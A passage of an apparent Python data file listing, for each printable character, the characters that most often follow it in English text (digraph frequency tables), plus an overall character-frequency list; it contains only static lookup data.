'f', 'g', 'j', 'r', 's', 'v', 'x', 'z', '{', '|', '}', '~'], 'R': ['i', 'o', 'e', 'E', ' ', 'a', 'I', 'S', 'u', 'Y', 'A', 'T', 'h', '.', 'D', 'M', 'O', 'C', ',', 'K', 'R', '!', '?', 'F', 'N', 'U', 'V', '\t', '\n', '\r', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'G', 'H', 'J', 'L', 'P', 'Q', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'U': ['n', 'p', 'L', 'S', 'T', 'R', 'N', ' ', 'I', ',', 'A', 's', 'C', 'G', 'l', '.', 'P', 'g', 'r', 't', "'", 'E', 'D', 'M', 'O', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'F', 'H', 'J', 'K', 'Q', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'h', 'i', 'j', 'k', 'm', 'o', 'q', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'T': ['h', 'o', 'u', ' ', 'r', 'e', 'H', 'a', 'i', 'w', 'E', 'I', '.', '\n', 'O', ',', 'R', '!', 'W', 'Y', 'N', 'S', 'y', '&', '?', 'A', 'L', 'U', 'T', 'c', 's', '\t', '\r', '"', '#', '$', '%', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'C', 'D', 'F', 'G', 'J', 'K', 'M', 'P', 'Q', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'f', 'g', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 't', 'v', 'x', 'z', '{', '|', '}', '~'], 'W': ['h', 'e', 'a', 'i', 'o', 'y', 'A', 'O', ' ', 'r', 'E', 'I', 'H', '.', ',', 'F', 'N', 'R', '?', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'C', 'D', 'G', 'J', 'K', 'L', 'M', 'P', 'Q', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'V': ['i', 'e', 'E', 'o', 'a', 'I', 'A', 'O', '.', '-', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Y': ['o', 'e', ' ', 'a', 'O', 'T', "'", ',', 'S', 'E', 'I', '\n', 'M', '.', 'u', '\t', '\r', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'N', 'P', 'Q', 'R', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'X': ['E', '!', '\t', '\n', '\r', ' ', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '[': ['G', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Z': ['e', 'a', 'o', 'u', 'z', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', '{', '|', '}', '~'], ']': [' ', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '_': [' ', '.', 'y', 'h', 'S', 'm', 't', '\n', ',', 'I', 'w', 'i', 's', 'H', 'a', '"', 'N', 'T', 'W', 'Y', 'd', 'n', 'p', 'u', '?', 'C', 'B', 'E', 'M', 'c', 'b', 'o', '\t', '\r', '!', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'A', 'D', 'F', 'G', 'J', 'K', 'L', 'O', 'P', 'Q', 'R', 'U', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'e', 'f', 'g', 'j', 'k', 'l', 'q', 'r', 'v', 'x', 'z', '{', '|', '}', '~'], 'a': ['n', 't', 's', 'r', 'l', ' ', 'd', 'i', 'c', 'y', 'g', 'v', 'm', 'b', 'k', 'p', 'u', 'w', '\n', 'f', 'z', ',', '.', "'", 'x', '-', 'h', 'j', '!', 'e', 'o', '?', 'a', ':', ';', 'q', '&', ')', '"', 'T', '\t', '\r', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~'], 'c': ['o', 'h', 'e', 'a', 'k', 't', 'i', 'l', 'r', 'u', 'y', 'c', ' ', 'q', 's', '.', ',', '\n', '-', ';', '!', ')', "'", '?', 'd', 'I', '&', ':', 'm', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'f', 'g', 'j', 'n', 'p', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'b': ['e', 'l', 'o', 'u', 'a', 'r', 'y', 'i', 's', 'b', 't', 'j', ' ', ',', 'm', '.', 'd', "'", '-', 'v', '\n', '?', 'n', ';', ':', 'h', '!', '&', ')', 'f', 'w', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'g', 'k', 'p', 'q', 'x', 'z', '{', '|', '}', '~'], 'e': [' ', 'r', 'n', 'd', 's', 'a', 'l', 'e', 't', '\n', ',', 'm', '.', 'v', 'c', 'y', 'p', 'f', 'i', 'w', 'x', "'", 'g', '-', 'o', '?', ';', 'h', 'k', '!', 'b', 'q', ':', 'u', 'j', 'z', '&', '_', ')', 'I', '"', 'B', 'J', 'P', 'T', '\t', '\r', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'C', 'D', 'E', 'F', 'G', 'H', 'K', 'L', 'M', 'N', 'O', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', '{', '|', '}', '~'], 'd': [' ', 'e', 'i', 'o', ',', '\n', '.', 'a', 's', 'r', 'y', 'd', 'n', 'l', 'u', '-', 'g', ';', "'", 'm', 'v', ':', '?', '!', 'f', 'w', 'h', 'b', 'j', ')', 'p', 'k', 't', '&', 'c', '_', 'q', 'I', 'T', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'x', 'z', '{', '|', '}', '~'], 'g': [' ', 'h', 'e', 'o', 'i', 'a', 'g', 'r', ',', 'l', 's', '.', '\n', 'u', 'n', '-', "'", 'y', ';', 't', '?', ':', 'm', '!', '&', 'p', 'f', '"', ')', 'b', 'w', 'T', '\t', '\r', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'd', 'j', 'k', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 'f': [' ', 'o', 'e', 'a', 'i', 'r', 'u', 'f', 't', '\n', 'l', ',', '.', '-', 'y', 's', ';', '?', ':', 'p', '!', 'h', '&', 'm', 'n', "'", ')', 'w', 'I', 'T', '_', 'b', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'c', 'd', 'g', 'j', 'k', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 'i': ['n', 't', 's', 'l', 'd', 'e', 'c', 'm', 'o', 'r', 'g', 'f', 'v', 'k', 'a', 'p', 'b', 'z', 'x', "'", 'u', ' ', 'q', '-', ',', 'h', '.', '\n', '&', '!', ')', ':', '?', '_', 'j', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ';', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'i', 'w', 'y', '{', '|', '}', '~'], 'h': ['e', 'a', 'i', ' ', 'o', 't', ',', 'u', 'r', 'y', '\n', '.', 'n', 's', '-', 'l', 'm', '!', 'b', "'", '?', ';', 'f', 'w', ':', 'd', 'h', 'q', 'c', '&', ')', 'p', 'I', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'g', 'j', 'k', 'v', 'x', 'z', '{', '|', '}', '~'], 'k': ['e', ' ', 'i', 'n', ',', 's', '.', '\n', 'y', 'l', '-', 'a', "'", '?', 'f', ';', 'w', '!', 'o', 'm', 'r', ':', 'h', 'c', 'g', 'u', 'b', 't', 'p', '&', 'd', '\t', '\r', '"', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'j', 'k', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 'j': ['u', 'e', 'o', 'a', 'i', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'm': ['e', 'a', ' ', 'o', 'i', 'y', 'p', 'u', ',', 's', '.', 'b', 'm', '\n', "'", 'n', ';', '-', '?', 'f', 'l', '!', ':', 'r', 't', '&', '_', 'c', ')', 'w', 'h', 'v', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'd', 'g', 'j', 'k', 'q', 'x', 'z', '{', '|', '}', '~'], 'l': ['e', 'l', 'i', ' ', 'y', 'o', 'd', 'a', 'f', ',', 'u', 't', 's', '.', 'k', '\n', 'm', 'w', 'v', 'p', '-', 'b', 'c', 'r', 'n', '?', ';', "'", '!', 'g', ':', 'h', '&', ')', '_', 'I', 'P', 'T', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'j', 'q', 'x', 'z', '{', '|', '}', '~'], 'o': ['u', 't', 'n', ' ', 'r', 'f', 'm', 'w', 'o', 'l', 's', 'k', 'v', 'd', 'p', 'i', 'c', '\n', 'b', ',', 'a', 'g', "'", '.', 'y', 'e', '-', 'x', 'h', '?', '!', ';', 'z', 'q', ':', 'j', '_', '&', '"', 'C', 'I', '\t', '\r', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', '{', '|', '}', '~'], 'n': [' ', 'd', 'g', 'e', 't', 'o', 'c', 's', "'", 'i', ',', 'a', '\n', '.', 'y', 'k', 'l', 'n', 'f', 'u', 'v', '-', ';', '?', 'w', 'j', 'q', 'r', 'b', '!', 'x', 'm', 'h', ':', 'p', 'z', '&', ')', 'I', '"', 'N', 'T', '_', '\t', '\r', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', '{', '|', '}', '~'], 'q': ['u', '.', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'p': ['e', 'o', 'a', 'r', 'l', ' ', 'i', 'p', 'u', 't', 's', 'h', ',', '.', 'y', '\n', "'", '-', ';', 'w', '?', '!', 'b', 'n', 'm', ':', 'k', '&', 'f', 'c', '"', 'T', '\t', '\r', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'd', 'g', 'j', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 's': [' ', 't', 'e', 'h', 'a', 'o', 'i', 's', ',', '.', 'u', '\n', 'p', 'c', 'l', 'm', 'k', 'n', 'w', 'y', ';', '?', 'b', '!', "'", ':', '-', 'f', 'g', 'q', '&', 'd', ')', 'r', '_', 'I', 'j', '"', 'A', 'M', 'v', '\t', '\r', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'x', 'z', '{', '|', '}', '~'], 'r': ['e', ' ', 'o', 'i', 'a', 's', 't', 'y', 'd', '.', ',', 'r', 'n', '\n', 'u', 'l', 'm', 'k', 'c', 'g', 'v', 'p', 'f', "'", '-', 'h', ';', '?', 'b', 'w', '!', ':', '&', '_', ')', 'j', '"', 'C', 'I', 'q', 'x', '\t', '\r', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'z', '{', '|', '}', '~'], 'u': ['o', 't', 's', 'l', 'r', 'n', ' ', 'g', 'p', 'c', 'e', 'i', 'm', 'd', 'a', 'b', "'", ',', '.', 'f', '\n', '?', 'k', 'y', 'z', ';', 'x', '!', '-', '_', 'v', 'w', ':', '&', 'h', 'q', 'I', '\t', '\r', '"', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'j', 'u', '{', '|', '}', '~'], 't': ['h', ' ', 'o', 'e', ';', 'i', 'a', 'r', 't', ',', '.', '\n', 's', 'l', 'u', 'y', "'", 'w', 'c', '-', '?', 'n', 'm', '!', 'f', ':', 'b', '&', 'g', 'z', 'p', 'I', 'd', ')', '_', 'k', '"', '(', 'T', ']', '\t', '\r', '#', '$', '%', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', '^', '`', 'j', 'q', 'v', 'x', '{', '|', '}', '~'], 'w': ['a', 'i', 'h', 'e', 'o', ' ', 'n', ',', 'r', 's', '.', 'l', '\n', '-', '?', 'f', ';', 'd', 'y', 'k', '!', "'", 'u', ':', 't', 'b', 'c', ')', '&', '_', 'm', 'I', 'q', 'p', '\t', '\r', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'g', 'j', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'v': ['e', 'i', 'a', 'o', 'y', 'u', ' ', 'r', 'b', '.', 'v', '\n', 's', '\t', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 't', 'w', 'x', 'z', '{', '|', '}', '~'], 'y': [' ', 'o', ',', '.', 'e', '\n', 's', 'i', 't', "'", '-', ';', 'b', '?', 'm', 'a', '!', ':', 'p', 'd', 'l', 'v', 'f', 'w', 'n', 'c', 'r', 'h', '&', ')', 'g', '_', 'z', 'y', 'k', '"', 'I', 'O', 'j', 'x', '\t', '\r', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'q', 'u', '{', '|', '}', '~'], 'x': ['p', 'c', 't', 'i', 'e', 'a', ' ', ',', 'h', 'u', '.', '-', 'o', 'q', 'f', 'y', '\n', '?', 'g', '!', "'", ';', 'n', '\t', '\r', '"', '#', '$', '%', '&', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'j', 'k', 'l', 'm', 'r', 's', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'z': ['e', 'z', 'i', ' ', 'l', 'y', ',', 'a', 'o', '.', "'", '\n', 'u', '?', ';', ':', 's', '!', 't', '\t', '\r', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 'r', 'v', 'w', 'x', '{', '|', '}', '~']}
characters_by_freq_english = [' ', 'e', 't', 'o', 'a', 'n', 'i', 'h', 's', 'r', 'l', 'd', 'u', 'm', 'w', 'g', 'f', 'c', 'y', ',', '\n', 'p', '.', 'b', 'v', 'k', ';', "'", 'q', '&', 'I', '-', 'T', 'M', 'S', 'A', '"', 'H', '?', 'B', 'W', 'x', 'E', 'Y', '!', 'L', 'j', 'D', 'N', 'O', 'P', 'G', 'C', 'J', ':', 'R', 'z', 'F', 'K', 'V', '_', 'U', ')', '(', '>', '1', '0', 'Q', 'Z', '9', '4', '7', '2', '8', '3', '5', '6', '#', 'X', '*', '[', ']']

diagraphs_english_no_nl = {'!': [' ', '&', '"', "'", '-', ')', 'A', 'H', 'T', 'B', 'I', 'S', 'W', ',', 'D', 'O', 'R', '_', '!', '>', 'F', 'N', 'P', 'U', 'V', 'Y', '#', '$', '%', '(', '*', '+', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '?', '@', 'C', 'E', 'G', 'J', 'K', 'L', 'M', 'Q', 'X', 'Z', '[', '\\', ']', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ' ': ['t', 'a', 'h', 's', 'w', 'o', 'i', 'b', 'm', 'f', 'c', 'l', 'd', 'p', 'n', 'y', 'I', 'r', 'g', 'e', 'T', 'M', 'u', ' ', 'S', 'A', '-', 'k', 'H', 'v', 'B', '&', 'W', 'L', 'q', 'P', 'j', 'E', 'D', 'J', 'G', "'", 'C', '"', 'R', 'Y', 'O', 'N', 'F', 'K', 'V', '(', '_', 'U', '.', 'Z', '1', 'Q', 'z', '4', '3', '2', '7', '!', '5', '8', '6', '?', '#', '$', '%', ')', '*', '+', ',', '/', '0', '9', ':', ';', '<', '=', '>', '@', 'X', '[', '\\', ']', '^', '`', 'x', '{', '|', '}', '~'], '#': ['1', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '"': ['\n', ' ', 'I', 'W', 'Y', 'T', 'A', 'S', 'M', 'D', 'H', 'N', 'O', 't', 'L', 'B', 'i', 'G', 'E', "'", 'w', 'F', 'P', 'a', 'C', 'y', 'b', '_', 'm', 's', '-', 'J', 'V', 'h', 'R', 'U', 'o', 'e', 'f', 'n', '?', 'K', 'Q', 'g', ';', 'd', 'k', 'l', 'r', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', ',', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '@', 'X', 'Z', '[', '\\', ']', '^', '`', 'c', 'j', 'p', 'q', 'u', 'v', 'x', 'z', '{', '|', '}', '~'], "'": ['s', 't', ' ', 'l', 'v', "'", 'm', 'r', 'd', 